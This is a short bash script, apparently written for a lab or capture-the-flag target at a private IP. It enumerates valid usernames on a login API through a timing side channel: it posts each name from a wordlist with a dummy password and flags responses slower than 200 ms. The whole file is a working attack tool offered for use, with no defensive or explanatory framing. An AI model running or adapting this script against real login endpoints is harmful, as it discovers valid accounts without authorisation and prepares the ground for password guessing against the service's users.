#!/bin/env bash

# NOTE: this is best run on the same network, where the average failure is 10ms
# on my home machine the latency is about 600ms, and the list takes forever to complete

# run with https://github.com/danielmiessler/SecLists/raw/master/Usernames/Names/names.txt

timingTest() {
    local tosend=$(echo \{\"username\":\"$1\",\"password\":\"nonsense\"})
    local start=$(date +%s%N)  
    curl -s -d $tosend -H "Content-Type: application/json" -X POST http://10.10.176.165:8080/api/user/login > /dev/null
    local finish="$((($(date +%s%N) - $start)/1000000))"
    if [[ $finish -gt 200 ]]; then
        echo "$1,$finish"
    fi
}

for name in $(cat $1); do
    timingTest $name
done